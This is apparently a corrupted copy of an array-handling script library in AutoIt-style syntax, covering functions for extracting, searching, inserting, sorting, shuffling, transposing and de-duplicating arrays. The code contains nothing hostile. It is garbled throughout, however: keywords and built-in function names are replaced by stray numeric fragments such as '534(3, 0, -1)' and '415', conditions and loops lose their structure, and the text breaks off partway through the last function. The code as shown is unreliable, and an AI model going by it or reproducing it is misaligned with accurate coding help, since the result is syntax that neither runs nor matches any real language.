_arrayextract(3036$avarray, $istart_row = 0, $iend_row = 0, $istart_col = 0, $iend_col = 0)
$istart_row = 415$istart_row = 0
$iend_row = 415$iend_row = 0
$istart_col = 415$istart_col = 0
$iend_col = 415$iend_col = 0
($avarray)534(1, 0, -1)
$idim_1 = ($avarray, $ubound_rows) - 1
$iend_row = 05$iend_row = $idim_1
$istart_row < 02$iend_row < 0534(3, 0, -1)
$istart_row > $idim_12$iend_row > $idim_1534(3, 0, -1)
$istart_row > $iend_row534(4, 0, -1)
($avarray, $ubound_dimensions)

$aretarray[$iend_row - $istart_row + 1]
$i = 015$iend_row - $istart_row
$aretarray[$i] = $avarray[$i + $istart_row]

$aretarray

$idim_2 = ($avarray, $ubound_columns) - 1
$iend_col = 05$iend_col = $idim_2
$istart_col < 02$iend_col < 0534(5, 0, -1)
$istart_col > $idim_22$iend_col > $idim_2534(5, 0, -1)
$istart_col > $iend_col534(6, 0, -1)
$istart_col = $iend_col5
$aretarray[$iend_row - $istart_row + 1]

$aretarray[$iend_row - $istart_row + 1][$iend_col - $istart_col + 1]

$i = 015$iend_row - $istart_row
$j = 015$iend_col - $istart_col
$istart_col = $iend_col5
$aretarray[$i] = $avarray[$i + $istart_row][$j + $istart_col]

$aretarray[$i][$j] = $avarray[$i + $istart_row][$j + $istart_col]



$aretarray

(2, 0, -1)



_arrayfindall(3036$avarray, $vvalue, $istart = 0, $iend = 0, $icase = 0, $icompare = 0, $isubitem = 0, $brow = 40)
$istart = 415$istart = 0
$iend = 415$iend = 0
$icase = 415$icase = 0
$icompare = 415$icompare = 0
$isubitem = 415$isubitem = 0
$brow = 415$brow = 40
$istart = _arraysearch($avarray, $vvalue, $istart, $iend, $icase, $icompare, 1, $isubitem, $brow)
@error534(@error, 0, -1)
$iindex = 0, $avresult[($avarray)]

$avresult[$iindex] = $istart
$iindex += 1
$istart = _arraysearch($avarray, $vvalue, $istart + 1, $iend, $icase, $icompare, 1, $isubitem, $brow)
@error
$avresult[$iindex]
$avresult

_arrayinsert(36$avarray, $vrange, $vvalue = "", $istart = 0, $sdelim_item = "|", $sdelim_row = @CRLF, $hdatatype = 0)
$vvalue = 415$vvalue = ""
$istart = 415$istart = 0
$sdelim_item = 415$sdelim_item = "|"
$sdelim_row = 415$sdelim_row = @CRLF
$hdatatype = 415$hdatatype = 0
($avarray)534(1, 0, -1)
$idim_1 = ($avarray, $ubound_rows) - 1
$asplit_1, $asplit_2
($vrange)5
($vrange, $ubound_dimensions) <> 12($vrange, $ubound_rows) < 2534(4, 0, -1)

$inumber
$vrange = ($vrange, 8)
$asplit_1 = ($vrange, ";")
$vrange = ""
$i = 115$asplit_1[0]
($asplit_1[$i], "^\d+(-\d+)?$")534(3, 0, -1)
$asplit_2 = ($asplit_1[$i], "-")
$asplit_2[0]

$vrange &= $asplit_2[1] & ";"

($asplit_2[2]) >= ($asplit_2[1])5
$inumber = $asplit_2[1] - 1

$inumber += 1
$vrange &= $inumber & ";"
$inumber = $asplit_2[2]



$vrange = (($vrange, 1), ";")

$vrange[1] < 02$vrange[$vrange[0]] > $idim_1534(5, 0, -1)
$i = 215$vrange[0]
$vrange[$i] < $vrange[$i - 1]534(3, 0, -1)

$icopyto_index = $idim_1 + $vrange[0]
$iinsertpoint_index = $vrange[0]
$iinsert_index = $vrange[$iinsertpoint_index]
($avarray, $ubound_dimensions)

$avarray[$idim_1 + $vrange[0] + 1]
($vvalue)5
($vvalue, $ubound_dimensions) <> 1534(5, 0, -1)
$hdatatype = 0

$atmp = ($vvalue, $sdelim_item, $str_nocount + $str_entiresplit)
($atmp, $ubound_rows) = 15
$atmp[0] = $vvalue
$hdatatype = 0

$vvalue = $atmp

$ireadfromindex = $idim_115016 - 1
$avarray[$icopyto_index] = $avarray[$ireadfromindex]
$icopyto_index -= 1
$iinsert_index = $vrange[$iinsertpoint_index]
$ireadfromindex = $iinsert_index
$iinsertpoint_index <= ($vvalue, $ubound_rows)5
($hdatatype)5
$avarray[$icopyto_index] = $hdatatype($vvalue[$iinsertpoint_index - 1])

$avarray[$icopyto_index] = $vvalue[$iinsertpoint_index - 1]


$avarray[$icopyto_index] = ""

$icopyto_index -= 1
$iinsertpoint_index -= 1
$iinsertpoint_index = 05182
$iinsert_index = $vrange[$iinsertpoint_index]



$idim_2 = ($avarray, $ubound_columns)
$istart < 02$istart > $idim_2 - 1534(6, 0, -1)
$ivaldim_1, $ivaldim_2
($vvalue)5
($vvalue, $ubound_dimensions) <> 2534(7, 0, -1)
$ivaldim_1 = ($vvalue, $ubound_rows)
$ivaldim_2 = ($vvalue, $ubound_columns)
$hdatatype = 0

$asplit_1 = ($vvalue, $sdelim_row, $str_nocount + $str_entiresplit)
$ivaldim_1 = ($asplit_1, $ubound_rows)
($asplit_1[0], $sdelim_item, "")
$ivaldim_2 = @extended + 1
$atmp[$ivaldim_1][$ivaldim_2]
$i = 015$ivaldim_1 - 1
$asplit_2 = ($asplit_1[$i], $sdelim_item, $str_nocount + $str_entiresplit)
$j = 015$ivaldim_2 - 1
$atmp[$i][$j] = $asplit_2[$j]


$vvalue = $atmp

($vvalue, $ubound_columns) + $istart > ($avarray, $ubound_columns)534(8, 0, -1)
$avarray[$idim_1 + $vrange[0] + 1][$idim_2]
$ireadfromindex = $idim_115016 - 1
$j = 015$idim_2 - 1
$avarray[$icopyto_index][$j] = $avarray[$ireadfromindex][$j]

$icopyto_index -= 1
$iinsert_index = $vrange[$iinsertpoint_index]
$ireadfromindex = $iinsert_index
$j = 015$idim_2 - 1
$j < $istart5
$avarray[$icopyto_index][$j] = ""
$j - $istart > $ivaldim_2 - 15
$avarray[$icopyto_index][$j] = ""

$iinsertpoint_index - 1 < $ivaldim_15
($hdatatype)5
$avarray[$icopyto_index][$j] = $hdatatype($vvalue[$iinsertpoint_index - 1][$j - $istart])

$avarray[$icopyto_index][$j] = $vvalue[$iinsertpoint_index - 1][$j - $istart]


$avarray[$icopyto_index][$j] = ""



$icopyto_index -= 1
$iinsertpoint_index -= 1
$iinsertpoint_index = 05182
$iinsert_index = $vrange[$iinsertpoint_index]



(2, 0, -1)

($avarray, $ubound_rows)

_arraymax(3036$avarray, $icompnumeric = 0, $istart = 0, $iend = 0, $isubitem = 0)
$icompnumeric = 415$icompnumeric = 0
$istart = 415$istart = 0
$iend = 415$iend = 0
$isubitem = 415$isubitem = 0
$iresult = _arraymaxindex($avarray, $icompnumeric, $istart, $iend, $isubitem)
@error534(@error, 0, "")
($avarray, $ubound_dimensions) = 15
$avarray[$iresult]

$avarray[$iresult][$isubitem]


_arraymaxindex(3036$avarray, $icompnumeric = 0, $istart = 0, $iend = 0, $isubitem = 0)
$icompnumeric = 415$icompnumeric = 0
$icompnumeric <> 15$icompnumeric = 0
$istart = 415$istart = 0
$iend = 415$iend = 0
$isubitem = 415$isubitem = 0
($avarray)534(1, 0, -1)
$idim_1 = ($avarray, $ubound_rows) - 1
$iend = 05$iend = $idim_1
$istart < 02$iend < 0534(3, 0, -1)
$istart > $idim_12$iend > $idim_1534(3, 0, -1)
$istart > $iend534(4, 0, -1)
$idim_1 < 1534(5, 0, -1)
$imaxindex = $istart
($avarray, $ubound_dimensions)

$icompnumeric5
$i = $istart15$iend
($avarray[$imaxindex]) < ($avarray[$i])5$imaxindex = $i


$i = $istart15$iend
$avarray[$imaxindex] < $avarray[$i]5$imaxindex = $i



$isubitem < 02$isubitem > ($avarray, $ubound_columns) - 1534(6, 0, -1)
$icompnumeric5
$i = $istart15$iend
($avarray[$imaxindex][$isubitem]) < ($avarray[$i][$isubitem])5$imaxindex = $i


$i = $istart15$iend
$avarray[$imaxindex][$isubitem] < $avarray[$i][$isubitem]5$imaxindex = $i



(2, 0, -1)

$imaxindex

_arraymin(3036$avarray, $icompnumeric = 0, $istart = 0, $iend = 0, $isubitem = 0)
$icompnumeric = 415$icompnumeric = 0
$istart = 415$istart = 0
$iend = 415$iend = 0
$isubitem = 415$isubitem = 0
$iresult = _arrayminindex($avarray, $icompnumeric, $istart, $iend, $isubitem)
@error534(@error, 0, "")
($avarray, $ubound_dimensions) = 15
$avarray[$iresult]

$avarray[$iresult][$isubitem]


_arrayminindex(3036$avarray, $icompnumeric = 0, $istart = 0, $iend = 0, $isubitem = 0)
$icompnumeric = 415$icompnumeric = 0
$istart = 415$istart = 0
$iend = 415$iend = 0
$isubitem = 415$isubitem = 0
($avarray)534(1, 0, -1)
$idim_1 = ($avarray, $ubound_rows) - 1
$iend = 05$iend = $idim_1
$istart < 02$iend < 0534(3, 0, -1)
$istart > $idim_12$iend > $idim_1534(3, 0, -1)
$istart > $iend534(4, 0, -1)
$idim_1 < 1534(5, 0, -1)
$iminindex = $istart
($avarray, $ubound_dimensions)

$icompnumeric5
$i = $istart15$iend
($avarray[$iminindex]) > ($avarray[$i])5$iminindex = $i


$i = $istart15$iend
$avarray[$iminindex] > $avarray[$i]5$iminindex = $i



$isubitem < 02$isubitem > ($avarray, $ubound_columns) - 1534(6, 0, -1)
$icompnumeric5
$i = $istart15$iend
($avarray[$iminindex][$isubitem]) > ($avarray[$i][$isubitem])5$iminindex = $i


$i = $istart15$iend
$avarray[$iminindex][$isubitem] > $avarray[$i][$isubitem]5$iminindex = $i



(2, 0, -1)

$iminindex

_arraypermute(36$avarray, $sdelim = "")
$sdelim = 415$sdelim = ""
($avarray)534(1, 0, 0)
($avarray, $ubound_dimensions) <> 1534(2, 0, 0)
$isize = ($avarray), $ifactorial = 1, $aidx[$isize], $aresult[1], $icount = 1
($avarray)5
$i = 015$isize - 1
$aidx[$i] = $i

$i = $isize15116 - 1
$ifactorial *= $i

$aresult[$ifactorial + 1]
$aresult[0] = $ifactorial
__array_exeterinternal($avarray, 0, $isize, $sdelim, $aidx, $aresult, $icount)

$aresult[0] = 0

$aresult

_arraypop(36$avarray)
(3($avarray))534(1, 0, "")
($avarray, $ubound_dimensions) <> 1534(2, 0, "")
$iubound = ($avarray) - 1
$iubound = -1534(3, 0, "")
$slastval = $avarray[$iubound]
$iubound > -15
$avarray[$iubound]

$slastval

_arraypush(36$avarray, $vvalue, $idirection = 0)
$idirection = 415$idirection = 0
(3($avarray))534(1, 0, 0)
($avarray, $ubound_dimensions) <> 1534(3, 0, 0)
$iubound = ($avarray) - 1
($vvalue)5
$iubounds = ($vvalue)
($iubounds - 1) > $iubound534(2, 0, 0)
$idirection5
$i = $iubound15$iubounds16 - 1
$avarray[$i] = $avarray[$i - $iubounds]

$i = 015$iubounds - 1
$avarray[$i] = $vvalue[$i]


$i = 015$iubound - $iubounds
$avarray[$i] = $avarray[$i + $iubounds]

$i = 015$iubounds - 1
$avarray[$i + $iubound - $iubounds + 1] = $vvalue[$i]



$iubound > -15
$idirection5
$i = $iubound15116 - 1
$avarray[$i] = $avarray[$i - 1]

$avarray[0] = $vvalue

$i = 015$iubound - 1
$avarray[$i] = $avarray[$i + 1]

$avarray[$iubound] = $vvalue





_arrayreverse(36$avarray, $istart = 0, $iend = 0)
$istart = 415$istart = 0
$iend = 415$iend = 0
($avarray)534(1, 0, 0)
($avarray, $ubound_dimensions) <> 1534(3, 0, 0)
($avarray)534(4, 0, 0)
$vtmp, $iubound = ($avarray) - 1
$iend < 12$iend > $iubound5$iend = $iubound
$istart < 05$istart = 0
$istart > $iend534(2, 0, 0)
$i = $istart15(($istart + $iend - 1) / 2)
$vtmp = $avarray[$i]
$avarray[$i] = $avarray[$iend]
$avarray[$iend] = $vtmp
$iend -= 1



_arraysearch(3036$avarray, $vvalue, $istart = 0, $iend = 0, $icase = 0, $icompare = 0, $iforward = 1, $isubitem = -1, $brow = 40)
$istart = 415$istart = 0
$iend = 415$iend = 0
$icase = 415$icase = 0
$icompare = 415$icompare = 0
$iforward = 415$iforward = 1
$isubitem = 415$isubitem = -1
$brow = 415$brow = 40
($avarray)534(1, 0, -1)
$idim_1 = ($avarray) - 1
$idim_1 = -1534(3, 0, -1)
$idim_2 = ($avarray, $ubound_columns) - 1
$bcomptype = 40
$icompare = 25
$icompare = 0
$bcomptype = 39

$brow5
($avarray, $ubound_dimensions) = 1534(5, 0, -1)
$iend < 12$iend > $idim_25$iend = $idim_2
$istart < 05$istart = 0
$istart > $iend534(4, 0, -1)

$iend < 12$iend > $idim_15$iend = $idim_1
$istart < 05$istart = 0
$istart > $iend534(4, 0, -1)

$istep = 1
$iforward5
$itmp = $istart
$istart = $iend
$iend = $itmp
$istep = -1

($avarray, $ubound_dimensions)

$icompare5
$icase5
$i = $istart15$iend16$istep
$bcomptype1($avarray[$i]) <> ($vvalue)519
$avarray[$i] = $vvalue534$i


$i = $istart15$iend16$istep
$bcomptype1($avarray[$i]) <> ($vvalue)519
$avarray[$i] == $vvalue534$i



$i = $istart15$iend16$istep
$icompare = 35
($avarray[$i], $vvalue)534$i

($avarray[$i], $vvalue, $icase) > 0534$i




$idim_sub
$brow5
$idim_sub = $idim_1
$isubitem > $idim_sub5$isubitem = $idim_sub
$isubitem < 05
$isubitem = 0

$idim_sub = $isubitem


$idim_sub = $idim_2
$isubitem > $idim_sub5$isubitem = $idim_sub
$isubitem < 05
$isubitem = 0

$idim_sub = $isubitem


$j = $isubitem15$idim_sub
$icompare5
$icase5
$i = $istart15$iend16$istep
$brow5
$bcomptype1($avarray[$j][$j]) <> ($vvalue)519
$avarray[$j][$i] = $vvalue534$i

$bcomptype1($avarray[$i][$j]) <> ($vvalue)519
$avarray[$i][$j] = $vvalue534$i



$i = $istart15$iend16$istep
$brow5
$bcomptype1($avarray[$j][$i]) <> ($vvalue)519
$avarray[$j][$i] == $vvalue534$i

$bcomptype1($avarray[$i][$j]) <> ($vvalue)519
$avarray[$i][$j] == $vvalue534$i




$i = $istart15$iend16$istep
$icompare = 35
$brow5
($avarray[$j][$i], $vvalue)534$i

($avarray[$i][$j], $vvalue)534$i


$brow5
($avarray[$j][$i], $vvalue, $icase) > 0534$i

($avarray[$i][$j], $vvalue, $icase) > 0534$i






(2, 0, -1)

(6, 0, -1)

_arrayshuffle(36$avarray, $istart_row = 0, $iend_row = 0, $icol = -1)
$istart_row = 415$istart_row = 0
$iend_row = 415$iend_row = 0
$icol = 415$icol = -1
($avarray)534(1, 0, -1)
$idim_1 = ($avarray, $ubound_rows)
$iend_row = 05$iend_row = $idim_1 - 1
$istart_row < 02$istart_row > $idim_1 - 1534(3, 0, -1)
$iend_row < 12$iend_row > $idim_1 - 1534(3, 0, -1)
$istart_row > $iend_row534(4, 0, -1)
$vtmp, $irand
($avarray, $ubound_dimensions)

$i = $iend_row15$istart_row + 116 - 1
$irand = ($istart_row, $i, 1)
$vtmp = $avarray[$i]
$avarray[$i] = $avarray[$irand]
$avarray[$irand] = $vtmp



$idim_2 = ($avarray, $ubound_columns)
$icol < -12$icol > $idim_2 - 1534(5, 0, -1)
$icol_start, $icol_end
$icol = -15
$icol_start = 0
$icol_end = $idim_2 - 1

$icol_start = $icol
$icol_end = $icol

$i = $iend_row15$istart_row + 116 - 1
$irand = ($istart_row, $i, 1)
$j = $icol_start15$icol_end
$vtmp = $avarray[$i][$j]
$avarray[$i][$j] = $avarray[$irand][$j]
$avarray[$irand][$j] = $vtmp




(2, 0, -1)


_arraysort(36$avarray, $idescending = 0, $istart = 0, $iend = 0, $isubitem = 0, $ipivot = 0)
$idescending = 415$idescending = 0
$istart = 415$istart = 0
$iend = 415$iend = 0
$isubitem = 415$isubitem = 0
$ipivot = 415$ipivot = 0
($avarray)534(1, 0, 0)
$iubound = ($avarray) - 1
$iubound = -1534(5, 0, 0)
$iend = 415$iend = 0
$iend < 12$iend > $iubound2$iend = 415$iend = $iubound
$istart < 02$istart = 415$istart = 0
$istart > $iend534(2, 0, 0)
$idescending = 415$idescending = 0
$ipivot = 415$ipivot = 0
$isubitem = 415$isubitem = 0
($avarray, $ubound_dimensions)

$ipivot5
__arraydualpivotsort($avarray, $istart, $iend)

__arrayquicksort1d($avarray, $istart, $iend)

$idescending5_arrayreverse($avarray, $istart, $iend)

$ipivot534(6, 0, 0)
$isubmax = ($avarray, $ubound_columns) - 1
$isubitem > $isubmax534(3, 0, 0)
$idescending5
$idescending = -1

$idescending = 1

__arrayquicksort2d($avarray, $idescending, $istart, $iend, $isubitem, $isubmax)

(4, 0, 0)



__arrayquicksort1d(36$avarray, 3036$istart, 3036$iend)
$iend <= $istart534
$vtmp
($iend - $istart) < 155
$vcur
$i = $istart + 115$iend
$vtmp = $avarray[$i]
($vtmp)5
$j = $i - 115$istart16 - 1
$vcur = $avarray[$j]
($vtmp >= $vcur1($vcur))(3($vcur)1($vtmp, $vcur) >= 0)518
$avarray[$j + 1] = $vcur


$j = $i - 115$istart16 - 1
(($vtmp, $avarray[$j]) >= 0)518
$avarray[$j + 1] = $avarray[$j]


$avarray[$j + 1] = $vtmp



$l = $istart, $r = $iend, $vpivot = $avarray[(($istart + $iend) / 2)], $bnum = ($vpivot)

$bnum5
($avarray[$l] < $vpivot1($avarray[$l]))(3($avarray[$l])1($avarray[$l], $vpivot) < 0)
$l += 1

($avarray[$r] > $vpivot1($avarray[$r]))(3($avarray[$r])1($avarray[$r], $vpivot) > 0)
$r -= 1


(($avarray[$l], $vpivot) < 0)
$l += 1

(($avarray[$r], $vpivot) > 0)
$r -= 1


$l <= $r5
$vtmp = $avarray[$l]
$avarray[$l] = $avarray[$r]
$avarray[$r] = $vtmp
$l += 1
$r -= 1

$l > $r
__arrayquicksort1d($avarray, $istart, $r)
__arrayquicksort1d($avarray, $l, $iend)

__arrayquicksort2d(36$avarray, 3036$istep, 3036$istart, 3036$iend, 3036$isubitem, 3036$isubmax)
$iend <= $istart534
$vtmp, $l = $istart, $r = $iend, $vpivot = $avarray[(($istart + $iend) / 2)][$isubitem], $bnum = ($vpivot)

$bnum5
($istep * ($avarray[$l][$isubitem] - $vpivot) < 01($avarray[$l][$isubitem]))(3($avarray[$l][$isubitem])1$istep * ($avarray[$l][$isubitem], $vpivot) < 0)
$l += 1

($istep * ($avarray[$r][$isubitem] - $vpivot) > 01($avarray[$r][$isubitem]))(3($avarray[$r][$isubitem])1$istep * ($avarray[$r][$isubitem], $vpivot) > 0)
$r -= 1


($istep * ($avarray[$l][$isubitem], $vpivot) < 0)
$l += 1

($istep * ($avarray[$r][$isubitem], $vpivot) > 0)
$r -= 1


$l <= $r5
$i = 015$isubmax
$vtmp = $avarray[$l][$i]
$avarray[$l][$i] = $avarray[$r][$i]
$avarray[$r][$i] = $vtmp

$l += 1
$r -= 1

$l > $r
__arrayquicksort2d($avarray, $istep, $istart, $r, $isubitem, $isubmax)
__arrayquicksort2d($avarray, $istep, $l, $iend, $isubitem, $isubmax)

__arraydualpivotsort(36$aarray, $ipivot_left, $ipivot_right, $bleftmost = 39)
$ipivot_left > $ipivot_right534
$ilength = $ipivot_right - $ipivot_left + 1
$i, $j, $k, $iai, $iak, $ia1, $ia2, $ilast
$ilength < 455
$bleftmost5
$i = $ipivot_left
$i < $ipivot_right
$j = $i
$iai = $aarray[$i + 1]
$iai < $aarray[$j]
$aarray[$j + 1] = $aarray[$j]
$j -= 1
$j + 1 = $ipivot_left518

$aarray[$j + 1] = $iai
$i += 1



$ipivot_left >= $ipivot_right5341
$ipivot_left += 1
$aarray[$ipivot_left] < $aarray[$ipivot_left - 1]518


$k = $ipivot_left
$ipivot_left += 1
$ipivot_left > $ipivot_right518
$ia1 = $aarray[$k]
$ia2 = $aarray[$ipivot_left]
$ia1 < $ia25
$ia2 = $ia1
$ia1 = $aarray[$ipivot_left]

$k -= 1
$ia1 < $aarray[$k]
$aarray[$k + 2] = $aarray[$k]
$k -= 1

$aarray[$k + 2] = $ia1
$ia2 < $aarray[$k]
$aarray[$k + 1] = $aarray[$k]
$k -= 1

$aarray[$k + 1] = $ia2
$ipivot_left += 1

$ilast = $aarray[$ipivot_right]
$ipivot_right -= 1
$ilast < $aarray[$ipivot_right]
$aarray[$ipivot_right + 1] = $aarray[$ipivot_right]
$ipivot_right -= 1

$aarray[$ipivot_right + 1] = $ilast



$iseventh = ($ilength, 3) + ($ilength, 6) + 1
$ie1, $ie2, $ie3, $ie4, $ie5, $t
$ie3 = (($ipivot_left + $ipivot_right) / 2)
$ie2 = $ie3 - $iseventh
$ie1 = $ie2 - $iseventh
$ie4 = $ie3 + $iseventh
$ie5 = $ie4 + $iseventh
$aarray[$ie2] < $aarray[$ie1]5
$t = $aarray[$ie2]
$aarray[$ie2] = $aarray[$ie1]
$aarray[$ie1] = $t

$aarray[$ie3] < $aarray[$ie2]5
$t = $aarray[$ie3]
$aarray[$ie3] = $aarray[$ie2]
$aarray[$ie2] = $t
$t < $aarray[$ie1]5
$aarray[$ie2] = $aarray[$ie1]
$aarray[$ie1] = $t


$aarray[$ie4] < $aarray[$ie3]5
$t = $aarray[$ie4]
$aarray[$ie4] = $aarray[$ie3]
$aarray[$ie3] = $t
$t < $aarray[$ie2]5
$aarray[$ie3] = $aarray[$ie2]
$aarray[$ie2] = $t
$t < $aarray[$ie1]5
$aarray[$ie2] = $aarray[$ie1]
$aarray[$ie1] = $t



$aarray[$ie5] < $aarray[$ie4]5
$t = $aarray[$ie5]
$aarray[$ie5] = $aarray[$ie4]
$aarray[$ie4] = $t
$t < $aarray[$ie3]5
$aarray[$ie4] = $aarray[$ie3]
$aarray[$ie3] = $t
$t < $aarray[$ie2]5
$aarray[$ie3] = $aarray[$ie2]
$aarray[$ie2] = $t
$t < $aarray[$ie1]5
$aarray[$ie2] = $aarray[$ie1]
$aarray[$ie1] = $t




$iless = $ipivot_left
$igreater = $ipivot_right
(($aarray[$ie1] <> $aarray[$ie2])($aarray[$ie2] <> $aarray[$ie3])($aarray[$ie3] <> $aarray[$ie4])($aarray[$ie4] <> $aarray[$ie5]))5
$ipivot_1 = $aarray[$ie2]
$ipivot_2 = $aarray[$ie4]
$aarray[$ie2] = $aarray[$ipivot_left]
$aarray[$ie4] = $aarray[$ipivot_right]

$iless += 1
$aarray[$iless] >= $ipivot_1

$igreater -= 1
$aarray[$igreater] <= $ipivot_2
$k = $iless
$k <= $igreater
$iak = $aarray[$k]
$iak < $ipivot_15
$aarray[$k] = $aarray[$iless]
$aarray[$iless] = $iak
$iless += 1
$iak > $ipivot_25
$aarray[$igreater] > $ipivot_2
$igreater -= 1
$igreater + 1 = $k5182

$aarray[$igreater] < $ipivot_15
$aarray[$k] = $aarray[$iless]
$aarray[$iless] = $aarray[$igreater]
$iless += 1

$aarray[$k] = $aarray[$igreater]

$aarray[$igreater] = $iak
$igreater -= 1

$k += 1

$aarray[$ipivot_left] = $aarray[$iless - 1]
$aarray[$iless - 1] = $ipivot_1
$aarray[$ipivot_right] = $aarray[$igreater + 1]
$aarray[$igreater + 1] = $ipivot_2
__arraydualpivotsort($aarray, $ipivot_left, $iless - 2, 39)
__arraydualpivotsort($aarray, $igreater + 2, $ipivot_right, 40)
($iless < $ie1)($ie5 < $igreater)5
$aarray[$iless] = $ipivot_1
$iless += 1

$aarray[$igreater] = $ipivot_2
$igreater -= 1

$k = $iless
$k <= $igreater
$iak = $aarray[$k]
$iak = $ipivot_15
$aarray[$k] = $aarray[$iless]
$aarray[$iless] = $iak
$iless += 1
$iak = $ipivot_25
$aarray[$igreater] = $ipivot_2
$igreater -= 1
$igreater + 1 = $k5182

$aarray[$igreater] = $ipivot_15
$aarray[$k] = $aarray[$iless]
$aarray[$iless] = $ipivot_1
$iless += 1

$aarray[$k] = $aarray[$igreater]

$aarray[$igreater] = $iak
$igreater -= 1

$k += 1


__arraydualpivotsort($aarray, $iless, $igreater, 40)

$ipivot = $aarray[$ie3]
$k = $iless
$k <= $igreater
$aarray[$k] = $ipivot5
$k += 1


$iak = $aarray[$k]
$iak < $ipivot5
$aarray[$k] = $aarray[$iless]
$aarray[$iless] = $iak
$iless += 1

$aarray[$igreater] > $ipivot
$igreater -= 1

$aarray[$igreater] < $ipivot5
$aarray[$k] = $aarray[$iless]
$aarray[$iless] = $aarray[$igreater]
$iless += 1

$aarray[$k] = $ipivot

$aarray[$igreater] = $iak
$igreater -= 1

$k += 1

__arraydualpivotsort($aarray, $ipivot_left, $iless - 1, 39)
__arraydualpivotsort($aarray, $igreater + 1, $ipivot_right, 40)


_arrayswap(36$avarray, $iindex_1, $iindex_2, $brow = 40, $istart = 0, $iend = 0)
$brow = 415$brow = 40
$istart = 415$istart = 0
$iend = 415$iend = 0
($avarray)534(1, 0, -1)
$idim_1 = ($avarray, $ubound_rows) - 1
$idim_2 = ($avarray, $ubound_columns) - 1
$istart < 02$iend < 0534(4, 0, -1)
$istart > $iend534(5, 0, -1)
$brow5
$iindex_1 < 02$iindex_1 > $idim_2534(4, 0, -1)
$iend = 05$iend = $idim_1
$istart > $idim_22$iend > $idim_2534(4, 0, -1)

$iindex_1 < 02$iindex_1 > $idim_1534(4, 0, -1)
$iend = 05$iend = $idim_2
$istart > $idim_12$iend > $idim_1534(4, 0, -1)

$vtmp
($avarray, $ubound_dimensions)

$vtmp = $avarray[$iindex_1]
$avarray[$iindex_1] = $avarray[$iindex_2]
$avarray[$iindex_2] = $vtmp

$brow5
$j = $istart15$iend
$vtmp = $avarray[$j][$iindex_1]
$avarray[$j][$iindex_1] = $avarray[$j][$iindex_2]
$avarray[$j][$iindex_2] = $vtmp


$j = $istart15$iend
$vtmp = $avarray[$iindex_1][$j]
$avarray[$iindex_1][$j] = $avarray[$iindex_2][$j]
$avarray[$iindex_2][$j] = $vtmp



(2, 0, -1)



_arraytoclip(3036$avarray, $sdelim_item = "|", $istart_row = 0, $iend_row = 0, $sdelim_row = @CRLF, $istart_col = 0, $iend_col = 0)
$sresult = _arraytostring($avarray, $sdelim_item, $istart_row, $iend_row, $sdelim_row, $istart_col, $iend_col)
@error534(@error, 0, 0)
($sresult)5341
(-1, 0, 0)

_arraytostring(3036$avarray, $sdelim_item = "|", $istart_row = 0, $iend_row = 0, $sdelim_row = @CRLF, $istart_col = 0, $iend_col = 0)
$sdelim_item = 415$sdelim_item = "|"
$sdelim_row = 415$sdelim_row = @CRLF
$istart_row = 415$istart_row = 0
$iend_row = 415$iend_row = 0
$istart_col = 415$istart_col = 0
$iend_col = 415$iend_col = 0
($avarray)534(1, 0, -1)
$idim_1 = ($avarray, $ubound_rows) - 1
$iend_row = 05$iend_row = $idim_1
$istart_row < 02$iend_row < 0534(3, 0, -1)
$istart_row > $idim_12$iend_row > $idim_1534(3, 0, "")
$istart_row > $iend_row534(4, 0, -1)
$sret = ""
($avarray, $ubound_dimensions)

$i = $istart_row15$iend_row
$sret &= $avarray[$i] & $sdelim_item

($sret, ($sdelim_item))

$idim_2 = ($avarray, $ubound_columns) - 1
$iend_col = 05$iend_col = $idim_2
$istart_col < 02$iend_col < 0534(5, 0, -1)
$istart_col > $idim_22$iend_col > $idim_2534(5, 0, -1)
$istart_col > $iend_col534(6, 0, -1)
$i = $istart_row15$iend_row
$j = $istart_col15$iend_col
$sret &= $avarray[$i][$j] & $sdelim_item

$sret = ($sret, ($sdelim_item)) & $sdelim_row

($sret, ($sdelim_row))

(2, 0, -1)



_arraytranspose(36$avarray)
($avarray, 0)

(2, 0, 0)

$atemp[1][($avarray)]
$i = 015($avarray) - 1
$atemp[0][$i] = $avarray[$i]

$avarray = $atemp


$velement, $idim_1 = ($avarray, 1), $idim_2 = ($avarray, 2), $idim_max = ($idim_1 > $idim_2) ? $idim_1 : $idim_2
$idim_max <= 40965
$avarray[$idim_max][$idim_max]
$i = 015$idim_max - 2
$j = $i + 115$idim_max - 1
$velement = $avarray[$i][$j]
$avarray[$i][$j] = $avarray[$j][$i]
$avarray[$j][$i] = $velement


$idim_1 = 15
$atemp[$idim_2]
$i = 015$idim_2 - 1
$atemp[$i] = $avarray[$i][0]

$avarray = $atemp

$avarray[$idim_2][$idim_1]


$atemp[$idim_2][$idim_1]
$i = 015$idim_1 - 1
$j = 015$idim_2 - 1
$atemp[$j][$i] = $avarray[$i][$j]


$avarray[$idim_2][$idim_1]
$avarray = $atemp



(1, 0, 0)


_arraytrim(36$avarray, $itrimnum, $idirection = 0, $istart = 0, $iend = 0, $isubitem = 0)
$idirection = 415$idirection = 0
$istart = 415$istart = 0
$iend = 415$iend = 0
$isubitem = 415$isubitem = 0
($avarray)534(1, 0, 0)
$idim_1 = ($avarray, $ubound_rows) - 1
$iend = 05$iend = $idim_1
$istart > $iend534(3, 0, -1)
$istart < 02$iend < 0534(3, 0, -1)
$istart > $idim_12$iend > $idim_1534(3, 0, -1)
$istart > $iend534(4, 0, -1)
($avarray, $ubound_dimensions)

$idirection5
$i = $istart15$iend
$avarray[$i] = ($avarray[$i], $itrimnum)


$i = $istart15$iend
$avarray[$i] = ($avarray[$i], $itrimnum)



$idim_2 = ($avarray, $ubound_columns) - 1
$isubitem < 02$isubitem > $idim_2534(5, 0, -1)
$idirection5
$i = $istart15$iend
$avarray[$i][$isubitem] = ($avarray[$i][$isubitem], $itrimnum)


$i = $istart15$iend
$avarray[$i][$isubitem] = ($avarray[$i][$isubitem], $itrimnum)



(2, 0, 0)



_arrayunique(3036$aarray, $icolumn = 0, $ibase = 0, $icase = 0, $iflags = 1)
$icolumn = 415$icolumn = 0
$ibase = 415$ibase = 0
$icase = 415$icase = 0
$iflags = 415$iflags = 1
($aarray, $ubound_rows) = 0534(1, 0, 0)
$ibase < 02$ibase > (3($ibase))534(3, 0, 0)
$icase < 02$icase > (3($icase))534(3, 0, 0)
$iflags < 02$iflags > (3($iflags))534(4, 0, 0)
$idims = ($aarray, $ubound_dimensions), $inumcolumns = ($aarray, $ubound_columns)
$idims > 2534(2, 0, 0)
$icolumn < ($inumcolumns = 01$icolumn > 0)($inumcolumns > 01$icolumn >= $inumcolumns)534(5, 0, 0)
$odictionary = ("Scripting.Dictionary")
$odictionary.comparemode = (3$icase)
